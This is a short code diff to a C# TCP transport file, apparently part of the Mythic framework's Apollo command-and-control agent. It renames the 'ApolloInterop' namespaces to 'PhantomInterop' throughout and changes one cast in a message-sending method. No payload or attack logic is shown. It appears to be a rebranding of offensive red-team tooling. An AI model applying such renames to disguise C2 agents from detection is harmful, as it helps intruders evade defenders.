@@ -2,21 +2,21 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Classes;
-using ApolloInterop.Structs.MythicStructs;
-using ApolloInterop.Types.Delegates;
-using ApolloInterop.Structs.ApolloStructs;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Classes;
+using PhantomInterop.Structs.MythicStructs;
+using PhantomInterop.Types.Delegates;
+using PhantomInterop.Structs.PhantomStructs;
 using System.Collections.Concurrent;
-using ApolloInterop.Enums.ApolloEnums;
+using PhantomInterop.Enums.PhantomEnums;
 using System.Threading;
 using ST = System.Threading.Tasks;
-using ApolloInterop.Serializers;
-using ApolloInterop.Constants;
+using PhantomInterop.Serializers;
+using PhantomInterop.Constants;
 using System.Net.Sockets;
-using ApolloInterop.Classes.Core;
-using ApolloInterop.Classes.Events;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes.Core;
+using PhantomInterop.Classes.Events;
+using PhantomInterop.Utils;
 
 namespace TcpTransport
 {
@@ -382,7 +382,7 @@ namespace TcpTransport
 
         public bool Send<IMythicMessage>(IMythicMessage message)
         {
-            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
+            return AddToSenderQueue((PhantomInterop.Interfaces.IMythicMessage)message);
         }
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
